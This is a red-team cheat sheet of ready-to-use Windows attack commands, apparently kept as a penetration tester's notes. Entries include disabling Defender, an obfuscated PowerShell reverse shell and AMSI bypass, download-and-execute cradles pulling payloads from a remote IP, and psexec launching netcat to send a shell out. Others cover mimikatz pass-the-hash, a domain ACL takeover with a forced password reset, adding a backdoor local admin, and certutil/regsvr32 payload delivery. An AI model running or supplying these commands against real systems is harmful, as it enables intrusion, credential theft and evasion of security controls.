# Red-Team-Essentials

## Disable Defender 

```Powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
 
## Services and startname 

```Powershell
 Get-WmiObject win32_service | format-Table name, startname, startmode
```

## Fore-Change PAssword - generic All 

```Powershell
Set-DomainObjectOwner -Identity stgadm -OwnerIdentity hexninja
Add-DomainObjectAcl -TargetIdentity stgadm -PrincipalIdentity hexninja
$newpass = ConvertTo-SecureString -String 'Password123! -AsPlainText -Force
Set-DomainUserPassword -Identity stgadm -AccountPassword $newpass
```

## Powershell Reverse Shell one Liner (AMSI Bypass)

```Powershell
$ip='192.168.1.114';$port=1337;$client = New-Object System.Net.Sockets.TCPClient -ArgumentList $ip, $port;$s = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};$l = "lol";Set-alias $l ([char]105 + [char]101 + [char]120);while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (lol $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()};$client.Close()
```

## Powershell Download in V4 and V5

```Powershell
 Invoke-WebRequest "http://10.10.15.58/hex.ps1" -OutFile "C:\Windows\TEMP\hex.ps1" 
 ```
 
 ## Ptt using mimikatz
 
```Powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:xyz.local /ntlm:ce03434e2f83b99704a631ae56e2146e /run:powershell.exe"'
```
 
 ## psexec 
 ```Powershell
./ps.exe \\\localip -h -accepteula -u username -p password cmd /c 'C:\nc.exe 192.168.50.138 4444 -e cmd.exe'
 ```
 
## Check Powershell Version 

```Powershell
 $PSVersionTable.PSVersion
```

## Download File Powershell V2 

```Powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.15.58/powerview.ps1', 'C:\users\someuser\Desktop\powerview.ps1') 
```

## Download Execute Powershell One Liner 

```Powershell
powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.58/payload.ps1')
```

## AMSI Bypass

```Powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Execute this on target machine if you get rdesktop's Cred SSP Error while using remotedesktop

```Cmd
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
 ```
 
 ## Remote desktop login through domain user credentials 
 
 ```sh
 xfreerdp /u:username /d:adcorp.local /p:"passwordxyz" /v:TARGETIP
 ```
 
 ## Download Execute powershell
 
 ```Cmd
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.15.58/payload.ps1')|iex"
 ```
 
 ## Pivoting using sshutle when you have rsa keys 

```sh
sshuttle -r root@TARGETIP -e "ssh -i rsa" TARGETIPRANGE.0/24
```

 ## Adding user on windows cmd line & adding it to local admin group 
 
```Cmd
net user hexninja lolbr654$@123 /ADD
net localgroup administrators hexninja /ADD
```

 ## CertUtil Download remote file
 
 ```cmd
certutil.exe -urlcache -f http://yourip/malicious.exe malicious.exe
```

## CertUtil decode base64

```cmd
certutil -decode malexecbase.b64 malexecutable.exe
```

## regsvr32 to execute malcious dll 

```cmd
regsvr32 /s /u .\exploit.dll
```

## Net1 (you read it right; it's not net) - available functions similar to net

```cmd
Net1 localgroup administrators
Net1 users
```

## Where utility to search for config files and everything 

```cmd
Examples:
    WHERE /?
    WHERE myfilename1 myfile????.*
    WHERE $windir:*.*
    WHERE /R c:\windows *.exe *.dll *.bat
    WHERE /Q ??.???
    WHERE "c:\windows;c:\windows\system32:*.dll"
    WHERE /F /T *.dll
```

